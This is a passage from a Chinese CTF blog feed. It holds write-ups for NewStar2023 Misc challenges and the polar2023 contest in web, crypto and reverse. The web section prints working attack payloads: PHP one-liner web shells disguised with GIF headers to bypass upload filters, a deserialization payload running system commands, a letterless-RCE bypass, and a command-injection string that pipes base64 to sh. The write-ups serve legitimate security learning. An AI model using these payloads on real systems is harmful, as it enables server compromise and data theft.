punctuation\">)</span>，文件头：5374616E64617264204A</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>WordPerfect <span class=\"token punctuation\">(</span>wpd<span class=\"token punctuation\">)</span>，文件头：FF575043</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Postscript <span class=\"token punctuation\">(</span>eps.or.ps<span class=\"token punctuation\">)</span>，文件头：252150532D41646F6265</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>Adobe Acrobat <span class=\"token punctuation\">(</span>pdf<span class=\"token punctuation\">)</span>，文件头：255044462D312E</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>Quicken <span class=\"token punctuation\">(</span>qdf<span class=\"token punctuation\">)</span>，文件头：AC9EBD8F</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>Windows Password <span class=\"token punctuation\">(</span>pwl<span class=\"token punctuation\">)</span>，文件头：E3828596</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>RAR Archive <span class=\"token punctuation\">(</span>rar<span class=\"token punctuation\">)</span>，文件头：52617221</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>Wave <span class=\"token punctuation\">(</span>wav<span class=\"token punctuation\">)</span>，文件头：57415645</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>AVI <span class=\"token punctuation\">(</span>avi<span class=\"token punctuation\">)</span>，文件头：41564920</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>Real Audio <span class=\"token punctuation\">(</span>ram<span class=\"token punctuation\">)</span>，文件头：2E7261FD</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>Real Media <span class=\"token punctuation\">(</span>rm<span class=\"token punctuation\">)</span>，文件头：2E524D46</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>MPEG <span class=\"token punctuation\">(</span>mpg<span class=\"token punctuation\">)</span>，文件头：000001BA</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>MPEG <span class=\"token punctuation\">(</span>mpg<span class=\"token punctuation\">)</span>，文件头：000001B3</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>Quicktime <span class=\"token punctuation\">(</span>mov<span class=\"token punctuation\">)</span>，文件头：6D6F6F76</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>Windows Media <span class=\"token punctuation\">(</span>asf<span class=\"token punctuation\">)</span>，文件头：3026B2758E66CF11</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>MIDI <span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span>，文件头：4D546864</pre></td></tr></table></figure><p><img data-src=\"../../../images/NewStar/3.png\" alt=\"3\" /></p>\n<p>改为 zip 文件头：</p>\n<blockquote>\n<p>50 4B 03 04</p>\n</blockquote>\n<p>保存为 Zip 文件解压得到 flag.zip，flag.zip 解压需要密码并且存在文件注释：</p>\n<p><img data-src=\"../../../images/NewStar/4.png\" alt=\"4\" /></p>\n<p>Base64 解码得到提示：I like six-digit numbers because they are very concise and easy to remember.</p>\n<p>可以直接使用 ArchPR 或者是 Ziperello 等工具进行 Zip 压缩包密码爆破，格式为六位纯数字，</p>\n<p>密码 232311，如果出现压缩包格式错误的问题使用 360 解压或 Unarchiver 等文件容错率较高的软件即可，解压得到 Flag：</p>\n<h3 id=\"空白格\"><a class=\"anchor\" href=\"#空白格\">#</a> 空白格</h3>\n<p>WhiteSpace 语言，可以在 <span class=\"exturl\" data-url=\"aHR0cHM6Ly92aWk1YXJkLmdpdGh1Yi5pby93aGl0ZXNwYWNlLz9hY2Nlc3NUb2tlbj1leUpoYkdjaU9pSklVekkxTmlJc0ltdHBaQ0k2SW1SbFptRjFiSFFpTENKMGVYQWlPaUpLVjFRaWZRLmV5SmxlSEFpT2pFMk9UWTNOVGszT0Rjc0ltWnBiR1ZIVlVsRUlqb2lXRXR4TkRJeFJVSkxla1o1VW5wQlRpSXNJbWxoZENJNk1UWTVOamMxT1RRNE55d2lhWE56SWpvaWRYQnNiMkZrWlhKZllXTmpaWE56WDNKbGMyOTFjbU5sSWl3aWRYTmxja2xrSWpvdE9ESTVOek16TkRReU5IMC5kZjFLZ24xSGVPZHJDcm9hOWxTdWVWYlF0ZC1nd28wTG80TnlHcmdOdXpJ\">https://vii5ard.github.io/whitespace/</span> 在线运行，运行即可获得 Flag：</p>\n<p><img data-src=\"../../../images/NewStar/5.png\" alt=\"5\" /></p>\n<h3 id=\"隐秘的眼睛\"><a class=\"anchor\" href=\"#隐秘的眼睛\">#</a> 隐秘的眼睛</h3>\n<p>使用 SilentEye 工具进行 Decode 即可获得 Flag：</p>\n<p><img data-src=\"../../../images/NewStar/6.png\" alt=\"6\" /></p>\n",
            "tags": [
                "CTF",
                "高贵的Misc",
                "NewStar2023",
                "该打杂了"
            ]
        },
        {
            "id": "https://p1kap1.github.io/CTF/web/polar2023%E4%B8%AA%E4%BA%BA%E8%B5%9B/",
            "url": "https://p1kap1.github.io/CTF/web/polar2023%E4%B8%AA%E4%BA%BA%E8%B5%9B/",
            "title": "polar2023个人赛",
            "date_published": "2023-09-22T16:00:00.000Z",
            "content_html": "<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h2>\n<h3 id=\"ezupload\"><a class=\"anchor\" href=\"#ezupload\">#</a> ezupload</h3>\n<p>一道简单的 mine 绕过，上传一句话木马，用 burpsuit 抓包后，修改文件头为：</p>\n<p>Content-Type: application/gif</p>\n<p>成功上传后访问文件用蚁剑连接即可。</p>\n<p>一句话木马：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>GIF89a</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h3 id=\"php-very-nice\"><a class=\"anchor\" href=\"#php-very-nice\">#</a> php very nice</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Example</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>     <span class=\"token keyword\">public</span> <span class=\"token variable\">$sys</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'Can you find the leak?'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>     <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>         <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">sys</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>     <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> <span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>反序列化后会调用__destruct () 函数。</p>\n<p>直接上代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Example</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$sys</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'system(\"cat f*\");'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Example</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>这里是已经执行过 system (&quot;ls&quot;); 知道 flag 文件在当前目录下了。</p>\n<p>payload:</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token selector\">?a=O:7:\"Example\":1:</span><span class=\"token punctuation\">&#123;</span><span class=\"token property\">s</span><span class=\"token punctuation\">:</span><span class=\"token property\">3</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"sys\"</span><span class=\"token punctuation\">;</span><span class=\"token property\">s</span><span class=\"token punctuation\">:</span><span class=\"token property\">17</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"system(\"</span>cat f*<span class=\"token string\">\");\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>检查网页源代码即可看到 flag。</p>\n<h3 id=\"wu\"><a class=\"anchor\" href=\"#wu\">#</a> wu</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[A-Za-z0-9]+/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>@<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>无字母 rce，取反绕过即可：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//$b = \"ls\";</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"cat zheshiflag.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>还有异或和自增方法，这里没有尝试。</p>\n<h3 id=\"再来ping一波啊\"><a class=\"anchor\" href=\"#再来ping一波啊\">#</a> 再来 ping 一波啊</h3>\n<p>;l\\s  得到回显 index.php。</p>\n<p>输入 cat 得到回显：</p>\n<blockquote>\n<p>常用的读取命令肯定不行，你要是想出绕过的也算你厉害。但过滤机制是改了的 -。-，你再研究研究？</p>\n</blockquote>\n<p>寻常的绕过方式估计是不行了，经过尝试可以用 base64 绕过，空格可以用 %09 和 $IFS$1 绕过，bash 被过滤了但 sh 没有被过滤。</p>\n<p>payload:</p>\n<blockquote>\n<p>/?ip=;echo$IFS<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>1</mn><mi mathvariant=\"normal\">&quot;</mi><mi>Y</mi><mn>2</mn><mi>F</mi><mn>0</mn><mi>I</mi><mi>G</mi><mi>l</mi><mi>u</mi><mi>Z</mi><mi>G</mi><mi>V</mi><mn>4</mn><mi>L</mi><mi>n</mi><mi>B</mi><mi>o</mi><mi>c</mi><mi>A</mi><mo>=</mo><mo>=</mo><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">∣</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mn>64</mn></mrow><annotation encoding=\"application/x-tex\">1&quot;Y2F0IGluZGV4LnBocA==&quot;|base64</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">2</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord\">0</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mord\">4</span><span class=\"mord mathnormal\">L</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.36687em;vertical-align:0em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">6</span><span class=\"mord\">4</span></span></span></span>IFS$1-d|sh</p>\n</blockquote>\n<p>检查网页源码即可。</p>\n<h3 id=\"代码审计1\"><a class=\"anchor\" href=\"#代码审计1\">#</a> 代码审计 1</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$sys</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'sys'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"|flag|\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$xsx</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>           <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag is no here!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$xsx</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'xsx'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token keyword\">new</span> <span class=\"token variable\">$sys</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xsx</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>看到    echo new <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>y</mi><mi>s</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">sys(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">(</span></span></span></span>xsx); 就可以知道此题需要利用 php 中的原生类。</p>\n<p>原生类具体参考以下文章：</p>\n<p><a href=\"https://blog.csdn.net/qq_63928796/article/details/127786521?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169545944516800197073634%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169545944516800197073634&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-127786521-null-null.142%5Ev94%5Einsert_down1&amp;utm_term=php%20%24a%28%24b%29&amp;spm=1018.2226.3001.4187\">php 中关于一些<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">a(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mopen\">(</span></span></span></span>b)</a></p>\n<p>使用</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?sys=DirectoryIterator&amp;xsx=<span class=\"token property\">glob</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//f*</span></pre></td></tr></table></figure><p>读取文件名</p>\n<p>得到回显：flag.php</p>\n<p>payload:</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?sys=SplFileObject&amp;xsx=<span class=\"token property\">php</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/convert.base64-encode/resource=flag.php</span></pre></td></tr></table></figure><p>base64 解码即可。</p>\n<h3 id=\"自由的文件上传系统\"><a class=\"anchor\" href=\"#自由的文件上传系统\">#</a> 自由的文件上传系统</h3>\n<p>上传一句话木马：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>GIF89a</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>得到回显：</p>\n<blockquote>\n<p>文件绝对路径: /var/www/html/upload/3385082283</p>\n</blockquote>\n<p>继续：</p>\n<p>/sectet_include.php?file=var/www/html/upload/3385082283</p>\n<p>尝试输入命令发现没用，检查网页源码后发现变成这样：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>GIF89a</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span>php <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">!</span><span class=\"token operator\">></span></pre></td></tr></table></figure><p>可以看到 '?' 变成了 '!'。</p>\n<p>注意到 php 版本 5.5.9，使用这个一句话木马绕过；</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>GIF89a<span class=\"token operator\">?</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">&lt;</span>script language<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token operator\">></span>@<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>重复上述操作后，使用蚁剑连接即可。</p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"天干地支\"><a class=\"anchor\" href=\"#天干地支\">#</a> 天干地支</h3>\n<p>解压压缩包后得到：</p>\n<p XXX=\"\">小李某一天收到一条微信，微信中写了几个不同的年份<br />\n丁丑 丙子 戊辰 壬午 丁丑 丙子 戊辰 壬午 壬辰 壬辰 辛未 丙戌<br />\n微信的后面还写有 “+ 甲子”，请解出这段密文。<br />\nflag 格式：flag</p>\n<p>照着这张表列出数字：</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/201.png\" alt=\"201\" height=\"510px\" width=\"422px\" /></p>\n<p>14 13 5 19 14 13 5 19 29 29 8 23</p>\n<p>由于还需要 “+ 甲子”, 所以再加上 60</p>\n<p>74 73 65 79 74 73 65 79 89 89 68 83</p>\n<p>转码即可：</p>\n<p>JIAOJIAOYYDS</p>\n<p JIAOJIAOYYDS=\"\">flag</p>\n<h2 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> Reverse</h2>\n<h3 id=\"64\"><a class=\"anchor\" href=\"#64\">#</a> ？64</h3>\n<p>直接运行 64.exe 即可：</p>\n<p>Base64 解码后，MD5 加密即是 flag。</p>\n<h3 id=\"sign-up\"><a class=\"anchor\" href=\"#sign-up\">#</a> Sign Up</h3>\n<p>运行该脚本即可：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>keyuser <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'9'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'6'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'8'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'9'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>keypass <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'o'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'o'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'t'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  uu <span class=\"token operator\">=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>keyuser<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  a<span class=\"token operator\">+=</span>uu</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  b<span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>keypass<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">+</span>b<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得到 0810570pmmr，不过得注意加上 09，md5 加密 081057009pmmr</p>\n<p>即为 flag。</p>\n<h3 id=\"java_tools\"><a class=\"anchor\" href=\"#java_tools\">#</a> Java_Tools</h3>\n<p><img data-src=\"../../../images/Iknowyouwillstop/2.png\" alt=\"201\" /></p>\n<p>HelloWorld!  Md5 加密即可.</p>\n<h2 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 